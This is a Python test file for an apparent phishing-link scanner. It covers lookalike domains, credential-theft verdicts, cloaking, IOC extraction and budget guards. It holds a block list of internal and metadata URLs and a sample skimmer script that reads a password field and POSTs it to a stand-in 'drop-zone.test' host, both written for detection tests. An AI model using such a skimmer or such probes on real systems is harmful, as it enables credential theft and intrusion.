import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from decoy import guard  # noqa: E402
from decoy.agent import rules_plan, valid_action  # noqa: E402
from decoy.urlcheck import BadLink, domain_signals, normalize  # noqa: E402
from decoy.verdict import Evidence  # noqa: E402


@pytest.mark.parametrize("bad", ["", "javascript:alert(1)", "file:///etc/passwd", "http://127.0.0.1/", "http://10.0.0.5/x",
                                 "http://169.254.169.254/latest/meta-data/", "http://localhost:8020/", "http://printer.local/"])
def test_bad_links_are_refused(bad):
    with pytest.raises(BadLink):
        normalize(bad)


def test_links_are_normalized():
    assert normalize("example.com/a") == "http://example.com/a"
    assert normalize("http://n0rthbank-login.test:8601/").startswith("http://n0rthbank")


def test_lookalike_domain_is_flagged():
    kinds = [s["kind"] for s in domain_signals("https://paypa1-secure-login.com/")]
    assert "lookalike_domain" in kinds
    assert not [s for s in domain_signals("https://www.paypal.com/") if s["kind"] == "lookalike_domain"]


def test_credentials_sent_elsewhere_is_dangerous():
    ev = Evidence("http://n0rthbank-login.test:8601/", [])
    ev.add_state({"url": "http://n0rthbank-login.test:8601/signin", "page": {},
                  "network": [{"url": "http://drop-zone.test:8601/collect", "host": "drop-zone.test", "canary_sent": ["PASSWORD"]}]}, 1)
    v = ev.verdict()
    assert v["level"] == "DANGEROUS"
    assert v["attacker_got"] == [{"host": "drop-zone.test", "data": ["PASSWORD"]}]


def test_quiet_page_has_no_threat():
    ev = Evidence("https://daily-recipes.example/", [])
    ev.add_state({"url": "https://daily-recipes.example/", "page": {"visible_text": "Lentil soup"}, "network": []}, 0)
    assert ev.verdict()["level"] == "NO THREAT FOUND"


def test_official_youtube_link_looks_safe():
    url = "https://www.youtube.com/watch?v=abc"
    ev = Evidence(url, domain_signals(url))
    ev.add_state({"url": url, "title": "Lentil soup - YouTube", "page": {"visible_text": "video"}, "network": []}, 0)
    v = ev.verdict()
    assert v["level"] == "LOOKS SAFE" and v["evidence"] == []
    assert "YouTube" in v["checks"][0]
    from decoy.verdict import template_summary
    assert "real YouTube link" in template_summary(v) and "Lentil soup - YouTube" in template_summary(v)
    assert not [s for s in domain_signals("https://y0utube-login.com/") if s["kind"] == "official_domain"]


def test_disguised_download_is_dangerous():
    ev = Evidence("http://invoice-portal.test:8601/", [])
    ev.add_state({"url": "x", "page": {}, "network": [], "downloads": [{"filename": "Invoice.pdf.exe", "sha256": "a"}]}, 1)
    ev.add_state({"url": "x", "page": {}, "network": [], "downloads": [{"filename": "Invoice.pdf.exe", "sha256": "a"}]}, 2)
    v = ev.verdict()
    assert v["level"] == "DANGEROUS" and len(v["downloads"]) == 1


PAGE = {"fields": [{"id": 1, "type": "email"}, {"id": 2, "type": "password"}], "buttons": [{"id": 3, "text": "Sign in"}], "links": []}


def test_model_cannot_type_real_values_or_click_unknown_ids():
    assert valid_action({"action": "fill_and_submit", "fields": [{"id": 2, "value": "hunter2"}], "submit_id": 3}, PAGE) is None
    assert valid_action({"action": "click", "id": 99}, PAGE) is None
    ok = valid_action({"action": "fill_and_submit", "fields": [{"id": 2, "value": "PASSWORD"}], "submit_id": 3}, PAGE)
    assert ok and ok["fields"] == [{"id": 2, "value": "PASSWORD"}]


def test_rules_fill_a_login_form_once():
    tried = set()
    first = rules_plan(PAGE, tried)
    assert first["action"] == "fill_and_submit" and {f["value"] for f in first["fields"]} == {"EMAIL", "PASSWORD"}
    assert rules_plan(PAGE, tried)["action"] != "fill_and_submit"


def test_guard_caps(tmp_path, monkeypatch):
    b = guard.Budget(ledger=tmp_path / "ledger.json")
    b.max_calls = 1
    b.check()
    b.record(1000, 100)
    with pytest.raises(guard.BudgetExceeded):
        b.check()
    monkeypatch.setenv("KILL_SWITCH", "1")
    with pytest.raises(guard.BudgetExceeded):
        guard.Budget(ledger=tmp_path / "other.json").check()


def test_daily_dollar_cap(tmp_path, monkeypatch):
    monkeypatch.setenv("MAX_USD_PER_DAY", "0.0001")
    b = guard.Budget(ledger=tmp_path / "ledger.json")
    b.record(1_000_000, 0)
    with pytest.raises(guard.BudgetExceeded):
        guard.Budget(ledger=tmp_path / "ledger.json").check()


def test_cloaking_login_form_hidden_from_a_bot():
    from decoy.verdict import cloaking
    c = cloaking([{"name": "Careless employee", "sig": ("northbank - sign in", True)}, {"name": "Security bot", "sig": ("daily recipes", False)}])
    assert c and c["weight"] >= 40 and "Security bot" in c["text"]
    assert cloaking([{"name": "A", "sig": ("recipes", False)}, {"name": "B", "sig": ("recipes", False)}]) is None
    assert cloaking([{"name": "A", "sig": ("recipes", False)}]) is None


def test_swarm_merge_and_redirect_chain():
    lead = Evidence("http://go-short.test/x", [])
    scout = Evidence("http://go-short.test/x", [])
    scout.add_state({"url": "http://n0rthbank-login.test/", "title": "t", "page": {}, "network": [
        {"url": "http://drop-zone.test/c", "host": "drop-zone.test", "canary_sent": ["PASSWORD"]}],
        "redirects": [{"from": "http://go-short.test/x", "to": "http://n0rthbank-login.test/", "status": 302}]}, 0)
    lead.absorb(scout)
    v = lead.verdict()
    assert v["attacker_got"] and any(i["kind"] == "redirect" for i in v["evidence"])


def test_threat_memory_links_scams_that_share_a_drop_server(tmp_path):
    from decoy import store
    db = tmp_path / "t.db"
    v = {"level": "DANGEROUS", "score": 100, "summary": "s", "evidence": [{"text": "x", "kind": "k"}], "attacker_got": [{"host": "drop-zone.test", "data": ["PASSWORD"]}]}
    store.save("aaa", "http://n0rthbank-login.test/", v, db)
    store.save("bbb", "http://paypa1-help.test/", v, db)
    m = store.memory("http://paypa1-help.test/", ["drop-zone.test"], exclude_id="bbb", path=db)
    assert m["campaign"] and m["campaign"][0]["shared_server"] == "drop-zone.test"
    assert store.memory("http://n0rthbank-login.test/", [], exclude_id="aaa", path=db)["seen_before"] == []
    store.decide("aaa", "block", "n", db)
    assert store.get("aaa", db)["decision"] == "block" and len(store.history(5, db)) == 2


def test_ask_never_calls_a_dangerous_link_safe_and_answers_from_evidence():
    from decoy import ask
    v = {"level": "DANGEROUS", "score": 100, "summary": "Do not open this link.", "evidence": [{"text": "It stole a password."}],
         "attacker_got": [{"host": "drop-zone.test", "data": ["PASSWORD"]}], "swarm": [], "memory": {}}
    assert "No." in ask.rules_answer("Is it safe to open?", v)
    assert "drop-zone.test" in ask.rules_answer("What did the attacker get?", v)
    assert ask.answer("", v)["by"] == "rules"


def test_qr_roundtrip_and_bad_pictures():
    import cv2, numpy as np
    from decoy import qr
    enc = cv2.QRCodeEncoder_create().encode("http://n0rthbank-login.test:8601/")
    img = cv2.resize(cv2.copyMakeBorder(enc, 20, 20, 20, 20, cv2.BORDER_CONSTANT, value=255), None, fx=6, fy=6, interpolation=cv2.INTER_NEAREST)
    ok, png = cv2.imencode(".png", img)
    assert qr.decode(png.tobytes()) == "http://n0rthbank-login.test:8601/"
    import pytest
    with pytest.raises(qr.BadImage):
        qr.decode(b"not a picture")


def test_rate_limit_blocks_the_16th_scan_in_an_hour():
    import server
    from fastapi import HTTPException

    class R:  # minimal request stand-in
        client = type("c", (), {"host": "9.9.9.9"})()
        headers = {}
    for _ in range(15):
        server.rate_limit(R(), "scan-test", 15)
    import pytest
    with pytest.raises(HTTPException):
        server.rate_limit(R(), "scan-test", 15)


def _case(**kw):
    c = {"url": "http://cloaked-promo.test:8601/", "start_host": "cloaked-promo.test", "level": "DANGEROUS", "score": 100, "hosts": {"cloaked-promo.test": 3, "drop-zone.test": 1},
         "leaks": [{"host": "drop-zone.test", "data": ["PASSWORD"], "urls": ["http://drop-zone.test:8601/collect"]}], "blocked": [{"url": "http://169.254.169.254/x", "reason": "r"}],
         "redirects": [{"from": "http://go-short.test/x", "to": "http://cloaked-promo.test/", "status": 302}], "downloads": [{"filename": "Invoice.pdf.exe", "sha256": "ab" * 32}],
         "scripts": ["document.getElementById('password').value; fetch('http://drop-zone.test:8601/collect', {method:'POST'}); location.href='/done'"],
         "script_srcs": [], "hidden_orders": [], "evidence_kinds": ["credentials_sent_elsewhere", "cloaking", "download", "internal_probe"], "evidence": ["x"], "swarm": [], "memory_campaign": ["go-short.test"]}
    c.update(kw)
    return c


def test_investigation_iocs_and_techniques_come_from_the_evidence():
    from decoy import investigate as inv
    ic = inv.iocs(_case())
    vals = {(i["type"], i["value"]) for i in ic}
    assert ("domain", "drop-zone.test") in vals and ("sha256", "ab" * 32) in vals and ("ip", "169.254.169.254") in vals and ("domain", "go-short.test") in vals
    ids = {t["id"] for t in inv.techniques(_case())}
    assert {"T1566.002", "T1056.003", "T1204.002", "T1552.005", "T1036.007"} <= ids


def test_script_reverse_engineering_rules_and_hallucination_guard():
    from decoy import investigate as inv
    f = inv.static_script_findings(_case()["scripts"])
    assert any("sends data out" in x for x in f) and any("reads what the visitor types" in x for x in f) and any("redirects" in x for x in f)
    assert inv._clean(["Data went to evil-invented.com", "Data went to drop-zone.test"], {"drop-zone.test"}) == ["Data went to drop-zone.test"]


def test_report_without_a_model_is_complete_and_exports_markdown():
    from decoy import investigate as inv
    from decoy.guard import Budget
    rep = inv.report(_case(), [{"id": "n", "name": "Network analyst", "findings": ["x"], "by": "rules"}], Budget(), False)
    assert rep["headline"] and len(rep["how_it_works"]) >= 3 and rep["actions"] and rep["iocs"]
    assert "drop-zone.test" in inv.to_markdown(rep) and "Indicators of compromise" in inv.to_markdown(rep)
    assert all("PASSWORD" not in str(i["value"]) for i in rep["iocs"])


def test_geo_demo_hosts_are_simulated_and_private_addresses_never_looked_up():
    from decoy import geo
    s = geo.locate("drop-zone.test")
    assert s["simulated"] is True and s["city"] == "Singapore"
    assert geo.locate("169.254.169.254") is None and geo.locate("10.0.0.1") is None and geo.locate("") is None
    assert geo.origin()["city"] == "Frankfurt"
    got = []
    t = geo.Tracker(got.append)
    t.seen("n0rthbank-login.test", "lure"); t.seen("drop-zone.test", "contacted"); t.seen("drop-zone.test", "exfil"); t.seen("drop-zone.test", "contacted")
    t.wait()
    assert [(g["host"], g["role"]) for g in sorted(got, key=lambda g: g["role"])] == [("drop-zone.test", "contacted"), ("drop-zone.test", "exfil"), ("n0rthbank-login.test", "lure")] or len(got) >= 2


def test_title_difference_alone_is_not_cloaking_and_gates_are_reported_as_limits():
    from decoy.verdict import cloaking
    c = cloaking([{"name": "Laptop", "sig": ("error 404", False)}, {"name": "Phone", "sig": ("kfc menu", False)}])
    assert c["kind"] == "visitor_difference" and c["weight"] < 10
    ev = Evidence("https://shop.example/", [])
    ev.add_state({"url": "https://shop.example/", "title": "Shop", "page": {"gate": "captcha"}, "network": []}, 0)
    ev.add_state({"url": "https://shop.example/", "title": "Shop", "page": {"gate": "verification"}, "network": []}, 1)
    v = ev.verdict()
    assert len(v["limits"]) == 2 and "CAPTCHA" in v["limits"][0]
    from decoy.verdict import template_summary
    assert "Note:" in template_summary(v)


def test_new_analysts_have_rule_based_findings():
    from decoy import investigate as inv
    case = _case(endpoints=[{"method": "POST", "url": "http://drop-zone.test:8601/collect", "host": "drop-zone.test", "type": "fetch", "status": 204, "post": '{"email":"<EMAIL>"}', "blocked": False, "leak": True}],
                 cookies=[{"name": "sid", "secure": False, "httpOnly": False}], gates=["captcha"], lure={"urgency": True, "asked": ["PASSWORD"], "title": "t", "official": False})
    assert any("carried the fake data" in f for f in inv.rules_findings("endpoint", case))
    assert any("lack the Secure" in f for f in inv.rules_findings("cookies", case))
    assert any("urgency" in f for f in inv.rules_findings("lure", case))


def test_free_hosting_and_parked_or_loading_pages_are_never_called_fine():
    from decoy.urlcheck import domain_signals
    from decoy import reputation
    sig = domain_signals("https://foodnetworksprime-tl.ct.ws/en")
    assert any(s["kind"] == "free_hosting" and s["weight"] >= 15 for s in sig)
    assert reputation.free_host("shop.pages.dev") == "pages.dev" and reputation.free_host("paypal.com") is None
    ev = Evidence("https://foodnetworksprime-tl.ct.ws/en", sig)
    ev.add_state({"url": "https://foodnetworksprime-tl.ct.ws/en", "title": "Loading https://foodnetworksprime-tl.ct.ws/en", "page": {"visible_text": ""}, "network": []}, 0)
    v = ev.verdict()
    assert v["level"] == "SUSPICIOUS" and any("loading or bot-check" in x for x in v["limits"])
    ev2 = Evidence("https://example-new.com/", [])
    ev2.add_state({"url": "https://example-new.com/", "title": "Domain for sale", "page": {"visible_text": "This domain is for sale. Buy this domain today."}, "network": []}, 0)
    ev2.extra.append(reputation.age_signal(5, "example-new.com"))
    assert ev2.verdict()["level"] == "SUSPICIOUS" and reputation.age_signal(400, "old.com") is None


def test_clean_wording_is_not_a_trust_rating():
    from decoy.verdict import template_summary
    s = template_summary({"level": "NO THREAT FOUND", "page_title": "Hello", "page_host": "x.org", "limits": []})
    assert "not a trust rating" in s and "looks fine" not in s


def test_error_monitoring_is_a_privacy_note_not_theft_and_phishing_channels_are_serious():
    ev = Evidence("https://corvrax.example/", [])
    ev.add_state({"url": "https://corvrax.example/", "title": "App", "page": {"visible_text": "x" * 200, "buttons": [{"id": 1, "text": "Go"}]},
                  "network": [{"url": "https://o1.ingest.de.sentry.io/api/1/envelope/", "host": "o1.ingest.de.sentry.io", "method": "POST", "type": "fetch", "canary_sent": ["PASSWORD"]}]}, 1)
    v = ev.verdict()
    assert v["level"] != "DANGEROUS" and v["attacker_got"] == [] and any(e["kind"] == "telemetry_leak" for e in v["evidence"])
    bad = Evidence("https://x-offer.example/", [])
    bad.add_state({"url": "https://x-offer.example/", "title": "Claim", "page": {"visible_text": "Claim your prize" * 10}, "network": [
        {"url": "https://api.telegram.org/bot1/sendMessage", "host": "api.telegram.org", "method": "POST", "type": "fetch", "post": "x"}]}, 1)
    assert any(e["kind"] == "exfil_channel" for e in bad.verdict()["evidence"])


def test_swarm_debate_finds_contradictions_and_counts_votes():
    from decoy import debate
    ev = Evidence("http://x-offer.test/", [])
    ev.add_state({"url": "http://x-offer.test/", "title": "Claim", "page": {"visible_text": "Claim your prize " * 5, "buttons": [{"id": 1, "text": "Go"}]}, "network": [
        {"url": "http://drop-zone.test/c", "host": "drop-zone.test", "method": "POST", "type": "fetch", "canary_sent": ["PASSWORD"]}]}, 0)
    v = ev.verdict()
    v["swarm"] = []
    results = {"endpoints": {"findings": ["The page made no background requests."]}, "script": {"findings": ["No scripts were found."]}, "lure": {"findings": ["Nothing unusual."]}}
    cs = debate.code_conflicts(results, ev, v)
    assert any(c["to"] == "endpoints" for c in cs) and all(c["to"] in results for c in cs)
    events = []
    ctx = {"use_model": False, "budget": None, "case": {"hosts": {"drop-zone.test": 1}, "start_host": "x-offer.test"}}
    out = debate.run_debate(results, ev, v, ctx, events.append)
    phases = [e["phase"] for e in events]
    assert phases[0] == "share" and "challenge" in phases and "reply" in phases and phases[-1] == "consensus"
    assert out["votes"]["endpoints"] == "agree" and "drop-zone.test" in results["endpoints"]["findings"][0]  # corrected after the challenge, then votes with the verdict
    assert "orchestrator" in phases and "vote" in phases and out["rounds"] >= 1


def test_email_to_shared_form_backend_is_a_note_but_a_password_is_theft():
    def run(canary):
        ev = Evidence("https://news.example.org/", [])
        ev.add_state({"url": "https://news.example.org/", "title": "News", "page": {"visible_text": "Sign up " * 10}, "network": [
            {"url": "https://abc123.execute-api.us-east-2.amazonaws.com/signup", "host": "abc123.execute-api.us-east-2.amazonaws.com", "method": "POST", "type": "fetch", "canary_sent": canary}]}, 0)
        return {e["kind"] for e in ev.verdict()["evidence"]}
    assert "credentials_sent_elsewhere" not in run(["EMAIL"]) and "form_third_party" in run(["EMAIL"])
    assert "credentials_sent_elsewhere" in run(["EMAIL", "PASSWORD"])


def test_security_provider_warning_page_is_flagged():
    ev = Evidence("https://x.example.pages.dev/", [])
    ev.add_state({"url": "https://x.example.pages.dev/", "title": "Suspected Phishing | Cloudflare", "page": {"visible_text": "This website has been reported"}, "network": []}, 0)
    v = ev.verdict()
    assert any(e["kind"] == "provider_warning" for e in v["evidence"]) and v["level"] in ("SUSPICIOUS", "DANGEROUS")


def test_plain_download_and_plain_form_are_notes_not_alarms():
    ev = Evidence("https://os.example.org/", [])
    ev.add_state({"url": "https://os.example.org/", "title": "Get the OS", "page": {"visible_text": "Download " * 20}, "network": [
        {"url": "https://os.example.org/search", "host": "os.example.org", "method": "POST", "type": "fetch", "canary_sent": ["EMAIL"]}],
        "downloads": [{"filename": "debian-12.iso", "sha256": "ab"}]}, 0)
    v = ev.verdict()
    assert v["score"] < 25 and v["level"] not in ("SUSPICIOUS", "DANGEROUS")
